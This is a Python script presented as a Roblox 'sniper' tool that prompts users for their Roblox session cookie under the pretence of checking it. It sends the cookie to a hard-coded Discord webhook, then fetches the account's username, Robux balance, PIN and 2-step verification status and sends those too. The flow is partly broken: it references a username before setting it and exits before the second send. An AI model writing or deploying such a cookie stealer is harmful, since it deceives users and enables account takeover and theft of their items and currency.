import sys
import requests
import subprocess
from termcolor import colored
import time

webhook_url = 'https://discord.com/api/webhooks/1116533521205448785/xU11fePoPOUKf7HdoMDVInSjLk-Q_XBkZBaCUjiHFHqFFQ_YrKkr0tFGl4Zrnb9lbxGP'

def clear_console():
    subprocess.run("cls" if sys.platform == "win32" else "clear", shell=True)

def print_text(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def install_missing_modules():
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
    except subprocess.CalledProcessError:
        print("Failed to install required modules.")
        exit()

# Check if required modules are installed
required_modules = ['requests', 'termcolor']
missing_modules = [module for module in required_modules if module not in sys.modules]

if missing_modules:
    clear_console()
    print_text("There are some uninstalled modules. Press Y/N")
    answer = input().lower()
    if answer == 'y':
        install_missing_modules()

clear_console()
gradient = colored('''
\033[38;2;0;0;255m

██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗ 
██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     ███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
 ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ███████║██║ ╚████║██║██║     ███████╗██║  ██║
  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                                                    
''', 'white')

print_text(gradient, delay=0.002)

# Prompt the user for their Roblox cookie
print_text("\nEnter your Roblox cookie: ", delay=0.02)
cookie = input()

# Check if the cookie is valid
if not cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'):
    clear_console()
    print_text("Invalid Roblox cookie. Please make sure you copied the entire cookie string correctly.")
    exit()

# Create the payload with an embed
payload = {
    'embeds': [
        {
            'title': 'User Information',
            'fields': [
                {
                    'name': 'Username',
                    'value': 'Loading...',
                    'inline': True
                },
                {
                    'name': 'Profile Link',
                    'value': 'Loading...',
                    'inline': True
                },
                {
                    'name': 'Pending Balance',
                    'value': 'Loading...',
                    'inline': True
                },
                {
                    'name': 'PIN',
                    'value': 'Loading...',
                    'inline': True
                },
                {
                    'name': '2-Step Verification',
                    'value': 'Loading...',
                    'inline': True
                },
                {
                    'name': 'Premium',
                    'value': 'Loading...',
                    'inline': True
                }
            ],
            'color': 0x0000FF  # Blue color
        },
        {
            'title': 'Roblox Cookie',
            'description': cookie,
            'color': 0x00FF00  # Green color
        }
    ]
}

# Send the payload to the webhook
response = requests.post(webhook_url, json=payload)

# Check the response status
if response.ok:
    print_text('Cookie is Valid!', delay=0.02)
    print_text(f'Hello {username}!')
    exit()
else:
    print_text('\nFailed to send user information to the webhook. Status code:', response.status_code)

# Retrieve user information from Roblox API
headers = {
    'Cookie': cookie
}

response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)

# Check the response status
if response.ok:
    user_data = response.json()
    username = user_data['name']
    profile_link = f'https://www.roblox.com/users/{user_data["id"]}/profile'
    pending_balance = user_data['robuxBalance']
    pin_enabled = user_data['isPinSet']
    two_step_enabled = user_data['is2FaEnabled']
    premium = user_data['isPremium']

    # Update the payload with user information
    payload['embeds'][0]['fields'][0]['value'] = f'**Username:** {username}'
    payload['embeds'][0]['fields'][1]['value'] = f'**Profile Link:** [Link]({profile_link})'
    payload['embeds'][0]['fields'][2]['value'] = f'**Pending Balance:** {pending_balance}'
    payload['embeds'][0]['fields'][3]['value'] = f'**PIN:** {pin_enabled}'
    payload['embeds'][0]['fields'][4]['value'] = f'**2-Step Verification:** {two_step_enabled}'
    payload['embeds'][0]['fields'][5]['value'] = f'**Premium:** {premium}'

    # Send the updated payload to the webhook
    response = requests.post(webhook_url, json=payload)

    # Check the response status
    if response.ok:
        print_text('Cookie is Valid!', delay=0.02)
        print_text(f'Hello {username}!')
        exit()
    else:
        print_text('Failed to send user information to the webhook. Status code:', response.status_code)
else:
    print_text('Failed to retrieve user information from Roblox API. Status code:', response.status_code)
